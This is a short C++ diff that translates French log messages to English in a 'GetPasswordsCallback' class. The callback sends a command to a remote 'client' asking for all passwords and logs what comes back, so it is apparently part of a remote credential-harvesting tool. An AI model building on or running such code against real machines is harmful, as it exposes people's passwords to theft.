@@ -267,14 +267,14 @@ class GetPasswordsCallback : public Callback
 		virtual void execute()
 		{
 			session << PASSWORDS_GETALL;
-			LOG << "Attente des mots de passe du client...";
+			LOG << "Waiting for passwords";
 			string buffer;
 			session >> buffer;
 			if(buffer == FINISHED)
 			{
 				return;
 			}
-			LOG << "Mots de passes recuperes : " + buffer;
+			LOG << "Passwords : " + buffer;
 		}
 	
 	private:	
